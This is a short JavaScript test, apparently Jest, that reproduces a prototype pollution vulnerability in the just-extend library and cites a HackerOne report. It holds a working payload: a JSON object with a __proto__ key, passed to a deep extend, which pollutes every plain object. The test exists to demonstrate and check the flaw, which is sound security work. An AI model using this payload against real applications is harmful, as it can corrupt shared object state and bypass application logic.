//https://hackerone.com/reports/430291
test("prototype pollution in just-extend ", () => {
    
    const extend = require('just-extend');

    let obj = {}

    expect({}.polluted).toBe(undefined);
    
    let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
    extend(true, {}, payload2);
    expect({}.polluted).toBe("yes");
  });